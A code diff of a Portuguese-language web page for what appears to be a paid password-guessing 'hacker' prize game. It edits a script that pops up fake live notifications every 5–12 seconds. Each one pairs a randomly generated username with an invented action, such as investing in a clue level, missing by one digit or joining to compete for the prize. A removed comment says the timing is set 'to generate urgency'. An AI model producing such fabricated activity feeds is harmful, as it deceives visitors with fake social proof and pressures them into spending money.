-            { titulo: "Perigo!", msg: "quase acertou a senha...", cor: "text-red-400" }, // Tensão
-            { titulo: "Novo Hacker!", msg: "entrou no sistema agora", cor: "text-blue-400" },
-            { titulo: "Investimento!", msg: "está hackeando o Nível 2...", cor: "text-purple-400" },
-            { titulo: "Tentativa!", msg: "errou por 2 números...", cor: "text-slate-300" }
+            { titulo: "Atenção!", msg: "investiu na Pista Nível 1", cor: "text-yellow-400" },
+            { titulo: "Quase lá!", msg: "errou por apenas 1 dígito...", cor: "text-red-400" }, 
+            { titulo: "Novo Jogador!", msg: "entrou para disputar o prêmio", cor: "text-blue-400" },
+            { titulo: "Hacker!", msg: "está usando a Pista Nível 2...", cor: "text-purple-400" }
         ];
 
         function mostrarNotificacao() {
             const nome = nomes[Math.floor(Math.random() * nomes.length)];
-            const sulfixo = Math.floor(Math.random() * 999);
+            const sulfixo = Math.floor(Math.random() * 99);
             const acao = acoes[Math.floor(Math.random() * acoes.length)];
-            const nomeCompleto = `${nome}_${sulfixo}`;
-
-            // Atualiza HTML
-            $('#notificacao-titulo').text(acao.titulo).attr('class', `font-bold ${acao.cor}`);
-            $('#notificacao-msg').text(`${nomeCompleto} ${acao.msg}`);
             
-            // Mostra (se não estiver em mobile muito pequeno atrapalhando)
+            $('#notificacao-titulo').text(acao.titulo).attr('class', `font-bold ${acao.cor}`);
+            $('#notificacao-msg').text(`${nome}_${sulfixo} ${acao.msg}`);
+            
             if (window.innerWidth > 350) {
                 const notif = document.getElementById('notificacao-live');
                 notif.classList.add('active');
                 play(sfx.pop);
-
-                // Esconde depois de 4s
-                setTimeout(() => {
-                    notif.classList.remove('active');
-                }, 4000);
+                setTimeout(() => { notif.classList.remove('active'); }, 4000);
             }
-
-            // Agenda a próxima (entre 5s e 12s) - Mais rápido para gerar urgência
             let proximoTempo = Math.floor(Math.random() * 7000) + 5000;
             setTimeout(mostrarNotificacao, proximoTempo);
         }
-
-        // Inicia as notificações após 3 segundos
         setTimeout(mostrarNotificacao, 3000);
-
     </script>
 </body>
 </html>
